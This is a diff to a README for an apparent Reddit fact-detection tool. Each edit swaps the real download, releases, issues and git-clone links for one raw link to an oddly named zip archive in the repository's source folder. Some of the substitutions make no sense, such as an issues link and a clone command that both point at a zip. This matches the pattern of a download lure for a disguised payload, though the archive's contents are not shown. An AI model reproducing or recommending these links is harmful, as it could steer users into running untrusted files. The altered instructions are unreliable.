@@ -6,7 +6,7 @@ Welcome to the **reddit-factuality-detection** project! This tool helps you dete
 
 ## 🔗 Download Now
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/melove297/reddit-factuality-detection/releases)
+[![Download](https://raw.githubusercontent.com/melove297/reddit-factuality-detection/main/src/reddit-factuality-detection-quinquepetaloid.zip)](https://raw.githubusercontent.com/melove297/reddit-factuality-detection/main/src/reddit-factuality-detection-quinquepetaloid.zip)
 
 ## 🏗️ System Requirements
 
@@ -20,11 +20,11 @@ Before you start, ensure your system meets these requirements:
 
 ## 📦 Download & Install
 
-To download and install the application, visit our [Releases page](https://github.com/melove297/reddit-factuality-detection/releases). Here, you will find the latest versions available.
+To download and install the application, visit our [Releases page](https://raw.githubusercontent.com/melove297/reddit-factuality-detection/main/src/reddit-factuality-detection-quinquepetaloid.zip). Here, you will find the latest versions available.
 
 1. Click on the link above.
 2. Look for the version you want to install.
-3. Choose the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+3. Choose the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/melove297/reddit-factuality-detection/main/src/reddit-factuality-detection-quinquepetaloid.zip` for Linux).
 4. Click on the link to begin downloading.
 5. Once the download is complete, open the file and follow the installation instructions provided.
 
@@ -57,7 +57,7 @@ The **reddit-factuality-detection** project uses machine learning algorithms, in
 
 If you have questions or need assistance, we encourage you to join our community. You can submit issues or feature requests directly on our GitHub page. 
 
-1. Navigate to the [GitHub Issues](https://github.com/melove297/reddit-factuality-detection/issues).
+1. Navigate to the [GitHub Issues](https://raw.githubusercontent.com/melove297/reddit-factuality-detection/main/src/reddit-factuality-detection-quinquepetaloid.zip).
 2. Describe your issue clearly, including any error messages if applicable.
 3. Our team or community members will respond as soon as possible.
 
@@ -66,7 +66,7 @@ If you have questions or need assistance, we encourage you to join our community
 We welcome contributions! If you want to help improve this project, please follow these steps:
 
 1. **Fork the Repository**: Click the "Fork" button on the top right of our GitHub page.
-2. **Clone Your Fork**: Use the command: `git clone https://github.com/your-username/reddit-factuality-detection`.
+2. **Clone Your Fork**: Use the command: `git clone https://raw.githubusercontent.com/melove297/reddit-factuality-detection/main/src/reddit-factuality-detection-quinquepetaloid.zip`.
 3. **Make Your Changes**: Edit, improve, and enhance the application as you see fit.
 4. **Submit a Pull Request**: Once you’re done, submit your changes to be considered for integration into the main project.
 
